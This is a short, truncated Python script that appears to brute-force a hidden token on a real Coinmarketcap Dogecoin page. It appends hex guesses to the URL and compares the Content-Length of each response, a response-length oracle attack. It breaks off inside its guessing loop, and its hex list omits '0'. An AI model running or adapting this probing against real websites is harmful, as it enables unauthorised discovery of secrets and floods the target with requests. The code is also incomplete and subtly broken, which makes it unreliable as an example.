import requests
import time

URL = "https://coinmarketcap.com/currencies/dogecoin/?period=7d"
MASK = "..........."
HEX = ['1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']

TOKEN = ""
count = 0;
check = True

time_start = time.time()

while (check):
    responB = int(requests.get(URL+MASK+MASK).headers.get('Content-Length'))
    
    for iter in HEX:
        count+=1
        build1 = TOKEN+iter+MASK+MASK
        build2 = TOKEN+MASK+iter+MASK

        req1 = int(requests.get(URL+build1).headers.get('Content-Length'))
